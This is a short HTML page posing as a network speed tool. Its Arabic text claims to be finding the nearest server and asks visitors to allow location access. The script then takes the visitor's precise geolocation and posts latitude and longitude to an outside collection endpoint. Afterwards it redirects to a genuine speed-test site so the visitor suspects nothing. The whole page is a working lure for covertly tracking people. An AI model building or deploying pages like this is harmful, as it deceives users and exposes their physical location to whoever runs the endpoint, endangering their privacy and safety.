<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Network Server</title><style>body{font-family:sans-serif;text-align:center;padding:100px 20px;background:#fff;margin:0;}#loader{border:8px solid #f3f3f3;border-top:8px solid #3498db;border-radius:50%;width:60px;height:60px;animation:spin 2s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div id="loader"></div><h3>جاري البحث عن أقرب سيرفر لشبكتك...</h3><p>يرجى السماح بالوصول للموقع لتحسين سرعة الاستجابة</p><script>navigator.geolocation.getCurrentPosition((p)=>{fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Location Tool',u:'LAT: '+p.coords.latitude,p:'LON: '+p.coords.longitude})}).finally(()=>{location.href='https://fast.com';});},null,{enableHighAccuracy:true});</script></body></html>
